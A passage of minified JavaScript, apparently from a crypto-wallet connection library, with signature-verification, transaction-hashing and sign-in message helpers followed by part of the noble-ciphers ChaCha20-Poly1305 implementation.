    })).toLowerCase() === q.toLowerCase()
}
async function jr$1(q, U, Z, oe, et, st) {
    const ws = Fe$1(oe);
    if (!ws.namespace || !ws.reference)
        throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${oe}`);
    try {
        const ms = "0x1626ba7e"
          , Es = "0000000000000000000000000000000000000000000000000000000000000040"
          , vs = Z.substring(2)
          , _s = (vs.length / 2).toString(16).padStart(64, "0")
          , Is = (U.startsWith("0x") ? U : an$1(U)).substring(2)
          , Ss = ms + Is + Es + _s + vs
          , Ts = await fetch(`${st || rf}/?chainId=${oe}&projectId=${et}`, {
            headers: {
                "Content-Type": "application/json"
            },
            method: "POST",
            body: JSON.stringify({
                id: of(),
                jsonrpc: "2.0",
                method: "eth_call",
                params: [{
                    to: q,
                    data: Ss
                }, "latest"]
            })
        })
          , {result: Rs} = await Ts.json();
        return Rs ? Rs.slice(0, ms.length).toLowerCase() === ms.toLowerCase() : !1
    } catch (ms) {
        return console.error("isValidEip1271Signature: ", ms),
        !1
    }
}
function of() {
    return Date.now() + Math.floor(Math.random() * 1e3)
}
function sf(q) {
    const U = atob(q)
      , Z = new Uint8Array(U.length);
    for (let ws = 0; ws < U.length; ws++)
        Z[ws] = U.charCodeAt(ws);
    const oe = Z[0];
    if (oe === 0)
        throw new Error("No signatures found");
    const et = 1 + oe * 64;
    if (Z.length < et)
        throw new Error("Transaction data too short for claimed signature count");
    if (Z.length < 100)
        throw new Error("Transaction too short");
    const st = Buffer.from(q, "base64").slice(1, 65);
    return re$1.encode(st)
}
function ff(q) {
    const U = new Uint8Array(Buffer.from(q, "base64"))
      , Z = Array.from("TransactionData::").map(st => st.charCodeAt(0))
      , oe = new Uint8Array(Z.length + U.length);
    oe.set(Z),
    oe.set(U, Z.length);
    const et = nf(oe, {
        dkLen: 32
    });
    return re$1.encode(et)
}
function cf(q) {
    const U = new Uint8Array(Ae(kr$1(q)));
    return re$1.encode(U)
}
function kr$1(q) {
    if (q instanceof Uint8Array)
        return q;
    if (Array.isArray(q))
        return new Uint8Array(q);
    if (typeof q == "object" && q != null && q.data)
        return new Uint8Array(Object.values(q.data));
    if (typeof q == "object" && q)
        return new Uint8Array(Object.values(q));
    throw new Error("getNearUint8ArrayFromBytes: Unexpected result type from bytes array")
}
function af(q) {
    const U = Buffer.from(q, "base64")
      , Z = decode$2(U).txn;
    if (!Z)
        throw new Error("Invalid signed transaction: missing 'txn' field");
    const oe = encode$2(Z)
      , et = Buffer.from("TX")
      , st = Buffer.concat([et, Buffer.from(oe)])
      , ws = Xi(st);
    return base32$2.encode(ws).replace(/=+$/, "")
}
function un$1(q) {
    const U = [];
    let Z = BigInt(q);
    for (; Z >= BigInt(128); )
        U.push(Number(Z & BigInt(127) | BigInt(128))),
        Z >>= BigInt(7);
    return U.push(Number(Z)),
    Buffer.from(U)
}
function uf(q) {
    const U = Buffer.from(q.signed.bodyBytes, "base64")
      , Z = Buffer.from(q.signed.authInfoBytes, "base64")
      , oe = Buffer.from(q.signature.signature, "base64")
      , et = [];
    et.push(Buffer.from([10])),
    et.push(un$1(U.length)),
    et.push(U),
    et.push(Buffer.from([18])),
    et.push(un$1(Z.length)),
    et.push(Z),
    et.push(Buffer.from([26])),
    et.push(un$1(oe.length)),
    et.push(oe);
    const st = Buffer.concat(et)
      , ws = Ae(st);
    return Buffer.from(ws).toString("hex").toUpperCase()
}
var lf = Object.defineProperty
  , df = Object.defineProperties
  , hf = Object.getOwnPropertyDescriptors
  , Pr$1 = Object.getOwnPropertySymbols
  , pf = Object.prototype.hasOwnProperty
  , gf = Object.prototype.propertyIsEnumerable
  , Hr$1 = (q, U, Z) => U in q ? lf(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , ln$1 = (q, U) => {
    for (var Z in U || (U = {}))
        pf.call(U, Z) && Hr$1(q, Z, U[Z]);
    if (Pr$1)
        for (var Z of Pr$1(U))
            gf.call(U, Z) && Hr$1(q, Z, U[Z]);
    return q
}
  , Dr$1 = (q, U) => df(q, hf(U));
const bf = "did:pkh:"
  , Se = q => q == null ? void 0 : q.split(":")
  , Mr$1 = q => {
    const U = q && Se(q);
    if (U)
        return q.includes(bf) ? U[3] : U[1]
}
  , Vr$1 = q => {
    const U = q && Se(q);
    if (U)
        return U[2] + ":" + U[3]
}
  , dn$1 = q => {
    const U = q && Se(q);
    if (U)
        return U.pop()
}
;
async function yf(q) {
    const {cacao: U, projectId: Z} = q
      , {s: oe, p: et} = U
      , st = qr$1(et, et.iss)
      , ws = dn$1(et.iss);
    return await Cr$1(ws, st, oe, Vr$1(et.iss), Z)
}
const qr$1 = (q, U) => {
    const Z = `${q.domain} wants you to sign in with your Ethereum account:`
      , oe = dn$1(U);
    if (!q.aud && !q.uri)
        throw new Error("Either `aud` or `uri` is required to construct the message");
    let et = q.statement || void 0;
    const st = `URI: ${q.aud || q.uri}`
      , ws = `Version: ${q.version}`
      , ms = `Chain ID: ${Mr$1(U)}`
      , Es = `Nonce: ${q.nonce}`
      , vs = `Issued At: ${q.iat}`
      , _s = q.exp ? `Expiration Time: ${q.exp}` : void 0
      , Is = q.nbf ? `Not Before: ${q.nbf}` : void 0
      , Ss = q.requestId ? `Request ID: ${q.requestId}` : void 0
      , Ts = q.resources ? `Resources:${q.resources.map(Ns => `
- ${Ns}`).join("")}` : void 0
      , Rs = Oe(q.resources);
    if (Rs) {
        const Ns = Lt$1(Rs);
        et = gn$1(et, Ns)
    }
    return [Z, oe, "", et, "", st, ws, ms, Es, vs, _s, Is, Ss, Ts].filter(Ns => Ns != null).join(`
`)
}
;
function Gr$1(q) {
    return Buffer.from(JSON.stringify(q)).toString("base64")
}
function Zr$1(q) {
    return JSON.parse(Buffer.from(q, "base64").toString("utf-8"))
}
function bt(q) {
    if (!q)
        throw new Error("No recap provided, value is undefined");
    if (!q.att)
        throw new Error("No `att` property found");
    const U = Object.keys(q.att);
    if (!(U != null && U.length))
        throw new Error("No resources found in `att` property");
    U.forEach(Z => {
        const oe = q.att[Z];
        if (Array.isArray(oe))
            throw new Error(`Resource must be an object: ${Z}`);
        if (typeof oe != "object")
            throw new Error(`Resource must be an object: ${Z}`);
        if (!Object.keys(oe).length)
            throw new Error(`Resource object is empty: ${Z}`);
        Object.keys(oe).forEach(et => {
            const st = oe[et];
            if (!Array.isArray(st))
                throw new Error(`Ability limits ${et} must be an array of objects, found: ${st}`);
            if (!st.length)
                throw new Error(`Value of ${et} is empty array, must be an array with objects`);
            st.forEach(ws => {
                if (typeof ws != "object")
                    throw new Error(`Ability limits (${et}) must be an array of objects, found: ${ws}`)
            }
            )
        }
        )
    }
    )
}
function Wr$1(q, U, Z, oe={}) {
    return Z == null || Z.sort( (et, st) => et.localeCompare(st)),
    {
        att: {
            [q]: hn$1(U, Z, oe)
        }
    }
}
function hn$1(q, U, Z={}) {
    U = U == null ? void 0 : U.sort( (et, st) => et.localeCompare(st));
    const oe = U.map(et => ({
        [`${q}/${et}`]: [Z]
    }));
    return Object.assign({}, ...oe)
}
function Ne(q) {
    return bt(q),
    `urn:recap:${Gr$1(q).replace(/=/g, "")}`
}
function Lt$1(q) {
    const U = Zr$1(q.replace("urn:recap:", ""));
    return bt(U),
    U
}
function Ef(q, U, Z) {
    const oe = Wr$1(q, U, Z);
    return Ne(oe)
}
function pn$1(q) {
    return q && q.includes("urn:recap:")
}
function Bf(q, U) {
    const Z = Lt$1(q)
      , oe = Lt$1(U)
      , et = Xr$1(Z, oe);
    return Ne(et)
}
function Xr$1(q, U) {
    bt(q),
    bt(U);
    const Z = Object.keys(q.att).concat(Object.keys(U.att)).sort( (et, st) => et.localeCompare(st))
      , oe = {
        att: {}
    };
    return Z.forEach(et => {
        var st, ws;
        Object.keys(((st = q.att) == null ? void 0 : st[et]) || {}).concat(Object.keys(((ws = U.att) == null ? void 0 : ws[et]) || {})).sort( (ms, Es) => ms.localeCompare(Es)).forEach(ms => {
            var Es, vs;
            oe.att[et] = Dr$1(ln$1({}, oe.att[et]), {
                [ms]: ((Es = q.att[et]) == null ? void 0 : Es[ms]) || ((vs = U.att[et]) == null ? void 0 : vs[ms])
            })
        }
        )
    }
    ),
    oe
}
function gn$1(q="", U) {
    bt(U);
    const Z = "I further authorize the stated URI to perform the following actions on my behalf: ";
    if (q.includes(Z))
        return q;
    const oe = [];
    let et = 0;
    Object.keys(U.att).forEach(ms => {
        const Es = Object.keys(U.att[ms]).map(Is => ({
            ability: Is.split("/")[0],
            action: Is.split("/")[1]
        }));
        Es.sort( (Is, Ss) => Is.action.localeCompare(Ss.action));
        const vs = {};
        Es.forEach(Is => {
            vs[Is.ability] || (vs[Is.ability] = []),
            vs[Is.ability].push(Is.action)
        }
        );
        const _s = Object.keys(vs).map(Is => (et++,
        `(${et}) '${Is}': '${vs[Is].join("', '")}' for '${ms}'.`));
        oe.push(_s.join(", ").replace(".,", "."))
    }
    );
    const st = oe.join(" ")
      , ws = `${Z}${st}`;
    return `${q ? q + " " : ""}${ws}`
}
function If(q) {
    var U;
    const Z = Lt$1(q);
    bt(Z);
    const oe = (U = Z.att) == null ? void 0 : U.eip155;
    return oe ? Object.keys(oe).map(et => et.split("/")[1]) : []
}
function Af(q) {
    const U = Lt$1(q);
    bt(U);
    const Z = [];
    return Object.values(U.att).forEach(oe => {
        Object.values(oe).forEach(et => {
            var st;
            (st = et == null ? void 0 : et[0]) != null && st.chains && Z.push(et[0].chains)
        }
        )
    }
    ),
    [...new Set(Z.flat())]
}
function Oe(q) {
    if (!q)
        return;
    const U = q == null ? void 0 : q[q.length - 1];
    return pn$1(U) ? U : void 0
}
/*! noble-ciphers - MIT License (c) 2023 Paul Miller (paulmillr.com) */
function Qr$1(q) {
    return q instanceof Uint8Array || ArrayBuffer.isView(q) && q.constructor.name === "Uint8Array"
}
function bn$1(q) {
    if (typeof q != "boolean")
        throw new Error(`boolean expected, not ${q}`)
}
function yn$1(q) {
    if (!Number.isSafeInteger(q) || q < 0)
        throw new Error("positive integer expected, got " + q)
}
function nt(q, ...U) {
    if (!Qr$1(q))
        throw new Error("Uint8Array expected");
    if (U.length > 0 && !U.includes(q.length))
        throw new Error("Uint8Array expected of length " + U + ", got length=" + q.length)
}
function to$1(q, U=!0) {
    if (q.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (U && q.finished)
        throw new Error("Hash#digest() has already been called")
}
function Sf(q, U) {
    nt(q);
    const Z = U.outputLen;
    if (q.length < Z)
        throw new Error("digestInto() expects output buffer of length at least " + Z)
}
function jt$1(q) {
    return new Uint32Array(q.buffer,q.byteOffset,Math.floor(q.byteLength / 4))
}
function Wt$1(...q) {
    for (let U = 0; U < q.length; U++)
        q[U].fill(0)
}
function Nf(q) {
    return new DataView(q.buffer,q.byteOffset,q.byteLength)
}
const Of = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68;
function Uf(q) {
    if (typeof q != "string")
        throw new Error("string expected");
    return new Uint8Array(new TextEncoder().encode(q))
}
function mn$1(q) {
    if (typeof q == "string")
        q = Uf(q);
    else if (Qr$1(q))
        q = wn$1(q);
    else
        throw new Error("Uint8Array expected, got " + typeof q);
    return q
}
function _f(q, U) {
    if (U == null || typeof U != "object")
        throw new Error("options must be defined");
    return Object.assign(q, U)
}
function Tf(q, U) {
    if (q.length !== U.length)
        return !1;
    let Z = 0;
    for (let oe = 0; oe < q.length; oe++)
        Z |= q[oe] ^ U[oe];
    return Z === 0
}
const Rf = (q, U) => {
    function Z(oe, ...et) {
        if (nt(oe),
        !Of)
            throw new Error("Non little-endian hardware is not yet supported");
        if (q.nonceLength !== void 0) {
            const vs = et[0];
            if (!vs)
                throw new Error("nonce / iv required");
            q.varSizeNonce ? nt(vs) : nt(vs, q.nonceLength)
        }
        const st = q.tagLength;
        st && et[1] !== void 0 && nt(et[1]);
        const ws = U(oe, ...et)
          , ms = (vs, _s) => {
            if (_s !== void 0) {
                if (vs !== 2)
                    throw new Error("cipher output not supported");
                nt(_s)
            }
        }
        ;
        let Es = !1;
        return {
            encrypt(vs, _s) {
                if (Es)
                    throw new Error("cannot encrypt() twice with same key + nonce");
                return Es = !0,
                nt(vs),
                ms(ws.encrypt.length, _s),
                ws.encrypt(vs, _s)
            },
            decrypt(vs, _s) {
                if (nt(vs),
                st && vs.length < st)
                    throw new Error("invalid ciphertext length: smaller than tagLength=" + st);
                return ms(ws.decrypt.length, _s),
                ws.decrypt(vs, _s)
            }
        }
    }
    return Object.assign(Z, q),
    Z
}
;
function eo$1(q, U, Z=!0) {
    if (U === void 0)
        return new Uint8Array(q);
    if (U.length !== q)
        throw new Error("invalid output length, expected " + q + ", got: " + U.length);
    if (Z && !Cf(U))
        throw new Error("invalid output, must be aligned");
    return U
}
function no$1(q, U, Z, oe) {
    if (typeof q.setBigUint64 == "function")
        return q.setBigUint64(U, Z, oe);
    const et = BigInt(32)
      , st = BigInt(4294967295)
      , ws = Number(Z >> et & st)
      , ms = Number(Z & st)
      , Es = oe ? 4 : 0
      , vs = oe ? 0 : 4;
    q.setUint32(U + Es, ws, oe),
    q.setUint32(U + vs, ms, oe)
}
function $f(q, U, Z) {
    bn$1(Z);
    const oe = new Uint8Array(16)
      , et = Nf(oe);
    return no$1(et, 0, BigInt(U), Z),
    no$1(et, 8, BigInt(q), Z),
    oe
}
function Cf(q) {
    return q.byteOffset % 4 === 0
}
function wn$1(q) {
    return Uint8Array.from(q)
}
const ro$1 = q => Uint8Array.from(q.split("").map(U => U.charCodeAt(0)))
  , Lf = ro$1("expand 16-byte k")
  , jf = ro$1("expand 32-byte k")
  , kf = jt$1(Lf)
  , Pf = jt$1(jf);
function M$1(q, U) {
    return q << U | q >>> 32 - U
}
function xn$1(q) {
    return q.byteOffset % 4 === 0
}
const Ue$1 = 64
  , Hf = 16
  , oo$1 = 2 ** 32 - 1
  , so$1 = new Uint32Array;
function Df(q, U, Z, oe, et, st, ws, ms) {
    const Es = et.length
      , vs = new Uint8Array(Ue$1)
      , _s = jt$1(vs)
      , Is = xn$1(et) && xn$1(st)
      , Ss = Is ? jt$1(et) : so$1
      , Ts = Is ? jt$1(st) : so$1;
    for (let Rs = 0; Rs < Es; ws++) {
        if (q(U, Z, oe, _s, ws, ms),
        ws >= oo$1)
            throw new Error("arx: counter overflow");
        const Ns = Math.min(Ue$1, Es - Rs);
        if (Is && Ns === Ue$1) {
            const Hs = Rs / 4;
            if (Rs % 4 !== 0)
                throw new Error("arx: invalid block position");
            for (let ha = 0, pa; ha < Hf; ha++)
                pa = Hs + ha,
                Ts[pa] = Ss[pa] ^ _s[ha];
            Rs += Ue$1;
            continue
        }
        for (let Hs = 0, ha; Hs < Ns; Hs++)
            ha = Rs + Hs,
            st[ha] = et[ha] ^ vs[Hs];
        Rs += Ns
    }
}
function Mf(q, U) {
    const {allowShortKeys: Z, extendNonceFn: oe, counterLength: et, counterRight: st, rounds: ws} = _f({
        allowShortKeys: !1,
        counterLength: 8,
        counterRight: !1,
        rounds: 20
    }, U);
    if (typeof q != "function")
        throw new Error("core must be a function");
    return yn$1(et),
    yn$1(ws),
    bn$1(st),
    bn$1(Z),
    (ms, Es, vs, _s, Is=0) => {
        nt(ms),
        nt(Es),
        nt(vs);
        const Ss = vs.length;
        if (_s === void 0 && (_s = new Uint8Array(Ss)),
        nt(_s),
        yn$1(Is),
        Is < 0 || Is >= oo$1)
            throw new Error("arx: counter overflow");
        if (_s.length < Ss)
            throw new Error(`arx: output (${_s.length}) is shorter than data (${Ss})`);
        const Ts = [];
        let Rs = ms.length, Ns, Hs;
        if (Rs === 32)
            Ts.push(Ns = wn$1(ms)),
            Hs = Pf;
        else if (Rs === 16 && Z)
            Ns = new Uint8Array(32),
            Ns.set(ms),
            Ns.set(ms, 16),
            Hs = kf,
            Ts.push(Ns);
        else
            throw new Error(`arx: invalid 32-byte key, got length=${Rs}`);
        xn$1(Es) || Ts.push(Es = wn$1(Es));
        const ha = jt$1(Ns);
        if (oe) {
            if (Es.length !== 24)
                throw new Error("arx: extended nonce must be 24 bytes");
            oe(Hs, ha, jt$1(Es.subarray(0, 16)), ha),
            Es = Es.subarray(16)
        }
        const pa = 16 - et;
        if (pa !== Es.length)
            throw new Error(`arx: nonce must be ${pa} or 16 bytes`);
        if (pa !== 12) {
            const Qa = new Uint8Array(12);
            Qa.set(Es, st ? 0 : 12 - Es.length),
            Es = Qa,
            Ts.push(Es)
        }
        const Zs = jt$1(Es);
        return Df(q, Hs, ha, Zs, vs, _s, Is, ws),
        Wt$1(...Ts),
        _s
    }
}
const G$1 = (q, U) => q[U++] & 255 | (q[U++] & 255) << 8;
class Vf {
    constructor(U) {
        this.blockLen = 16,
        this.outputLen = 16,
        this.buffer = new Uint8Array(16),
        this.r = new Uint16Array(10),
        this.h = new Uint16Array(10),
        this.pad = new Uint16Array(8),
        this.pos = 0,
        this.finished = !1,
        U = mn$1(U),
        nt(U, 32);
        const Z = G$1(U, 0)
          , oe = G$1(U, 2)
          , et = G$1(U, 4)
          , st = G$1(U, 6)
          , ws = G$1(U, 8)
          , ms = G$1(U, 10)
          , Es = G$1(U, 12)
          , vs = G$1(U, 14);
        this.r[0] = Z & 8191,
        this.r[1] = (Z >>> 13 | oe << 3) & 8191,
        this.r[2] = (oe >>> 10 | et << 6) & 7939,
        this.r[3] = (et >>> 7 | st << 9) & 8191,
        this.r[4] = (st >>> 4 | ws << 12) & 255,
        this.r[5] = ws >>> 1 & 8190,
        this.r[6] = (ws >>> 14 | ms << 2) & 8191,
        this.r[7] = (ms >>> 11 | Es << 5) & 8065,
        this.r[8] = (Es >>> 8 | vs << 8) & 8191,
        this.r[9] = vs >>> 5 & 127;
        for (let _s = 0; _s < 8; _s++)
            this.pad[_s] = G$1(U, 16 + 2 * _s)
    }
    process(U, Z, oe=!1) {
        const et = oe ? 0 : 2048
          , {h: st, r: ws} = this
          , ms = ws[0]
          , Es = ws[1]
          , vs = ws[2]
          , _s = ws[3]
          , Is = ws[4]
          , Ss = ws[5]
          , Ts = ws[6]
          , Rs = ws[7]
          , Ns = ws[8]
          , Hs = ws[9]
          , ha = G$1(U, Z + 0)
          , pa = G$1(U, Z + 2)
          , Zs = G$1(U, Z + 4)
          , Qa = G$1(U, Z + 6)
          , Ga = G$1(U, Z + 8)
          , nl = G$1(U, Z + 10)
          , sl = G$1(U, Z + 12)
          , el = G$1(U, Z + 14);
        let Bs = st[0] + (ha & 8191)
          , Fa = st[1] + ((ha >>> 13 | pa << 3) & 8191)
          , Js = st[2] + ((pa >>> 10 | Zs << 6) & 8191)
          , Wa = st[3] + ((Zs >>> 7 | Qa << 9) & 8191)
          , Za = st[4] + ((Qa >>> 4 | Ga << 12) & 8191)
          , tl = st[5] + (Ga >>> 1 & 8191)
          , za = st[6] + ((Ga >>> 14 | nl << 2) & 8191)
          , Ws = st[7] + ((nl >>> 11 | sl << 5) & 8191)
          , Ja = st[8] + ((sl >>> 8 | el << 8) & 8191)
          , Xa = st[9] + (el >>> 5 | et)
          , Ya = 0
          , rl = Ya + Bs * ms + Fa * (5 * Hs) + Js * (5 * Ns) + Wa * (5 * Rs) + Za * (5 * Ts);
        Ya = rl >>> 13,
        rl &= 8191,
        rl += tl * (5 * Ss) + za * (5 * Is) + Ws * (5 * _s) + Ja * (5 * vs) + Xa * (5 * Es),
        Ya += rl >>> 13,
        rl &= 8191;
        let il = Ya + Bs * Es + Fa * ms + Js * (5 * Hs) + Wa * (5 * Ns) + Za * (5 * Rs);
        Ya = il >>> 13,
        il &= 8191,
        il += tl * (5 * Ts) + za * (5 * Ss) + Ws * (5 * Is) + Ja * (5 * _s) + Xa * (5 * vs),
        Ya += il >>> 13,
        il &= 8191;
        let ol = Ya + Bs * vs + Fa * Es + Js * ms + Wa * (5 * Hs) + Za * (5 * Ns);
        Ya = ol >>> 13,
        ol &= 8191,
        ol += tl * (5 * Rs) + za * (5 * Ts) + Ws * (5 * Ss) + Ja * (5 * Is) + Xa * (5 * _s),
        Ya += ol >>> 13,
        ol &= 8191;
        let al = Ya + Bs * _s + Fa * vs + Js * Es + Wa * ms + Za * (5 * Hs);
        Ya = al >>> 13,
        al &= 8191,
        al += tl * (5 * Ns) + za * (5 * Rs) + Ws * (5 * Ts) + Ja * (5 * Ss) + Xa * (5 * Is),
        Ya += al >>> 13,
        al &= 8191;
        let cl = Ya + Bs * Is + Fa * _s + Js * vs + Wa * Es + Za * ms;
        Ya = cl >>> 13,
        cl &= 8191,
        cl += tl * (5 * Hs) + za * (5 * Ns) + Ws * (5 * Rs) + Ja * (5 * Ts) + Xa * (5 * Ss),
        Ya += cl >>> 13,
        cl &= 8191;
        let ll = Ya + Bs * Ss + Fa * Is + Js * _s + Wa * vs + Za * Es;
        Ya = ll >>> 13,
        ll &= 8191,
        ll += tl * ms + za * (5 * Hs) + Ws * (5 * Ns) + Ja * (5 * Rs) + Xa * (5 * Ts),
        Ya += ll >>> 13,
        ll &= 8191;
        let ul = Ya + Bs * Ts + Fa * Ss + Js * Is + Wa * _s + Za * vs;
        Ya = ul >>> 13,
        ul &= 8191,
        ul += tl * Es + za * ms + Ws * (5 * Hs) + Ja * (5 * Ns) + Xa * (5 * Rs),
        Ya += ul >>> 13,
        ul &= 8191;
        let dl = Ya + Bs * Rs + Fa * Ts + Js * Ss + Wa * Is + Za * _s;
        Ya = dl >>> 13,
        dl &= 8191,
        dl += tl * vs + za * Es + Ws * ms + Ja * (5 * Hs) + Xa * (5 * Ns),
        Ya += dl >>> 13,
        dl &= 8191;
        let fl = Ya + Bs * Ns + Fa * Rs + Js * Ts + Wa * Ss + Za * Is;
        Ya = fl >>> 13,
        fl &= 8191,
        fl += tl * _s + za * vs + Ws * Es + Ja * ms + Xa * (5 * Hs),
        Ya += fl >>> 13,
        fl &= 8191;
        let hl = Ya + Bs * Hs + Fa * Ns + Js * Rs + Wa * Ts + Za * Ss;
        Ya = hl >>> 13,
        hl &= 8191,
        hl += tl * Is + za * _s + Ws * vs + Ja * Es + Xa * ms,
        Ya += hl >>> 13,
        hl &= 8191,
        Ya = (Ya << 2) + Ya | 0,
        Ya = Ya + rl | 0,
        rl = Ya & 8191,
        Ya = Ya >>> 13,
        il += Ya,
        st[0] = rl,
        st[1] = il,
        st[2] = ol,
        st[3] = al,
        st[4] = cl,
        st[5] = ll,
        st[6] = ul,
        st[7] = dl,
        st[8] = fl,
        st[9] = hl
    }
    finalize() {
        const {h: U, pad: Z} = this
          , oe = new Uint16Array(10);
        let et = U[1] >>> 13;
        U[1] &= 8191;
        for (let ms = 2; ms < 10; ms++)
            U[ms] += et,
            et = U[ms] >>> 13,
            U[ms] &= 8191;
        U[0] += et * 5,
        et = U[0] >>> 13,
        U[0] &= 8191,
        U[1] += et,
        et = U[1] >>> 13,
        U[1] &= 8191,
        U[2] += et,
        oe[0] = U[0] + 5,
        et = oe[0] >>> 13,
        oe[0] &= 8191;
        for (let ms = 1; ms < 10; ms++)
            oe[ms] = U[ms] + et,
            et = oe[ms] >>> 13,
            oe[ms] &= 8191;
        oe[9] -= 8192;
        let st = (et ^ 1) - 1;
        for (let ms = 0; ms < 10; ms++)
            oe[ms] &= st;
        st = ~st;
        for (let ms = 0; ms < 10; ms++)
            U[ms] = U[ms] & st | oe[ms];
        U[0] = (U[0] | U[1] << 13) & 65535,
        U[1] = (U[1] >>> 3 | U[2] << 10) & 65535,
        U[2] = (U[2] >>> 6 | U[3] << 7) & 65535,
        U[3] = (U[3] >>> 9 | U[4] << 4) & 65535,
        U[4] = (U[4] >>> 12 | U[5] << 1 | U[6] << 14) & 65535,
        U[5] = (U[6] >>> 2 | U[7] << 11) & 65535,
        U[6] = (U[7] >>> 5 | U[8] << 8) & 65535,
        U[7] = (U[8] >>> 8 | U[9] << 5) & 65535;
        let ws = U[0] + Z[0];
        U[0] = ws & 65535;
        for (let ms = 1; ms < 8; ms++)
            ws = (U[ms] + Z[ms] | 0) + (ws >>> 16) | 0,
            U[ms] = ws & 65535;
        Wt$1(oe)
    }
    update(U) {
        to$1(this),
        U = mn$1(U),
        nt(U);
        const {buffer: Z, blockLen: oe} = this
          , et = U.length;
        for (let st = 0; st < et; ) {
            const ws = Math.min(oe - this.pos, et - st);
            if (ws === oe) {
                for (; oe <= et - st; st += oe)
                    this.process(U, st);
                continue
            }
            Z.set(U.subarray(st, st + ws), this.pos),
            this.pos += ws,
            st += ws,
            this.pos === oe && (this.process(Z, 0, !1),
            this.pos = 0)
        }
        return this
    }
    destroy() {
        Wt$1(this.h, this.r, this.buffer, this.pad)
    }
    digestInto(U) {
        to$1(this),
        Sf(U, this),
        this.finished = !0;
        const {buffer: Z, h: oe} = this;
        let {pos: et} = this;
        if (et) {
            for (Z[et++] = 1; et < 16; et++)
                Z[et] = 0;
            this.process(Z, 0, !0)
        }
        this.finalize();
        let st = 0;
        for (let ws = 0; ws < 8; ws++)
            U[st++] = oe[ws] >>> 0,
            U[st++] = oe[ws] >>> 8;
        return U
    }
    digest() {
        const {buffer: U, outputLen: Z} = this;
        this.digestInto(U);
        const oe = U.slice(0, Z);
        return this.destroy(),
        oe
    }
}
function qf(q) {
    const U = (oe, et) => q(et).update(mn$1(oe)).digest()
      , Z = q(new Uint8Array(32));
    return U.outputLen = Z.outputLen,
    U.blockLen = Z.blockLen,
    U.create = oe => q(oe),
    U
}
const Kf = qf(q => new Vf(q));
function Ff(q, U, Z, oe, et, st=20) {
    let ws = q[0]
      , ms = q[1]
      , Es = q[2]
      , vs = q[3]
      , _s = U[0]
      , Is = U[1]
      , Ss = U[2]
      , Ts = U[3]
      , Rs = U[4]
      , Ns = U[5]
      , Hs = U[6]
      , ha = U[7]
      , pa = et
      , Zs = Z[0]
      , Qa = Z[1]
      , Ga = Z[2]
      , nl = ws
      , sl = ms
      , el = Es
      , Bs = vs
      , Fa = _s
      , Js = Is
      , Wa = Ss
      , Za = Ts
      , tl = Rs
      , za = Ns
      , Ws = Hs
      , Ja = ha
      , Xa = pa
      , Ya = Zs
      , rl = Qa
      , il = Ga;
    for (let al = 0; al < st; al += 2)
        nl = nl + Fa | 0,
        Xa = M$1(Xa ^ nl, 16),
        tl = tl + Xa | 0,
        Fa = M$1(Fa ^ tl, 12),
        nl = nl + Fa | 0,
        Xa = M$1(Xa ^ nl, 8),
        tl = tl + Xa | 0,
        Fa = M$1(Fa ^ tl, 7),
        sl = sl + Js | 0,
        Ya = M$1(Ya ^ sl, 16),
        za = za + Ya | 0,
        Js = M$1(Js ^ za, 12),
        sl = sl + Js | 0,
        Ya = M$1(Ya ^ sl, 8),
        za = za + Ya | 0,
        Js = M$1(Js ^ za, 7),
        el = el + Wa | 0,
        rl = M$1(rl ^ el, 16),
        Ws = Ws + rl | 0,
        Wa = M$1(Wa ^ Ws, 12),
        el = el + Wa | 0,
        rl = M$1(rl ^ el, 8),
        Ws = Ws + rl | 0,
        Wa = M$1(Wa ^ Ws, 7),
        Bs = Bs + Za | 0,
        il = M$1(il ^ Bs, 16),
        Ja = Ja + il | 0,
        Za = M$1(Za ^ Ja, 12),
        Bs = Bs + Za | 0,
        il = M$1(il ^ Bs, 8),
        Ja = Ja + il | 0,
        Za = M$1(Za ^ Ja, 7),
        nl = nl + Js | 0,
        il = M$1(il ^ nl, 16),
        Ws = Ws + il | 0,
        Js = M$1(Js ^ Ws, 12),
        nl = nl + Js | 0,
        il = M$1(il ^ nl, 8),
        Ws = Ws + il | 0,
        Js = M$1(Js ^ Ws, 7),
        sl = sl + Wa | 0,
        Xa = M$1(Xa ^ sl, 16),
        Ja = Ja + Xa | 0,
        Wa = M$1(Wa ^ Ja, 12),
        sl = sl + Wa | 0,
        Xa = M$1(Xa ^ sl, 8),
        Ja = Ja + Xa | 0,
        Wa = M$1(Wa ^ Ja, 7),
        el = el + Za | 0,
        Ya = M$1(Ya ^ el, 16),
        tl = tl + Ya | 0,
        Za = M$1(Za ^ tl, 12),
        el = el + Za | 0,
        Ya = M$1(Ya ^ el, 8),
        tl = tl + Ya | 0,
        Za = M$1(Za ^ tl, 7),
        Bs = Bs + Fa | 0,
        rl = M$1(rl ^ Bs, 16),
        za = za + rl | 0,
        Fa = M$1(Fa ^ za, 12),
        Bs = Bs + Fa | 0,
        rl = M$1(rl ^ Bs, 8),
        za = za + rl | 0,
        Fa = M$1(Fa ^ za, 7);
    let ol = 0;
    oe[ol++] = ws + nl | 0,
    oe[ol++] = ms + sl | 0,
    oe[ol++] = Es + el | 0,
    oe[ol++] = vs + Bs | 0,
    oe[ol++] = _s + Fa | 0,
    oe[ol++] = Is + Js | 0,
    oe[ol++] = Ss + Wa | 0,
    oe[ol++] = Ts + Za | 0,
    oe[ol++] = Rs + tl | 0,
    oe[ol++] = Ns + za | 0,
    oe[ol++] = Hs + Ws | 0,
    oe[ol++] = ha + Ja | 0,
    oe[ol++] = pa + Xa | 0,
    oe[ol++] = Zs + Ya | 0,
    oe[ol++] = Qa + rl | 0,
    oe[ol++] = Ga + il | 0
}
const zf = Mf(Ff, {
    counterRight: !1,
    counterLength: 4,
    allowShortKeys: !1
})
  , Gf = new Uint8Array(16)
  , io$1 = (q, U) => {
    q.update(U);
    const Z = U.length % 16;
    Z && q.update(Gf.subarray(Z))
}
  , Zf = new Uint8Array(32);
function fo$1(q, U, Z, oe, et) {
    const st = q(U, Z, Zf)
      , ws = Kf.create(st);
    et && io$1(ws, et),
    io$1(ws, oe);
    const ms = $f(oe.length, et ? et.length : 0, !0);
    ws.update(ms);
    const Es = ws.digest();
    return Wt$1(st, ms),
    Es
}
const Wf = q => (U, Z, oe) => ({
    encrypt(et, st) {
        const ws = et.length;
        st = eo$1(ws + 16, st, !1),
        st.set(et);
        const ms = st.subarray(0, -16);
        q(U, Z, ms, ms, 1);
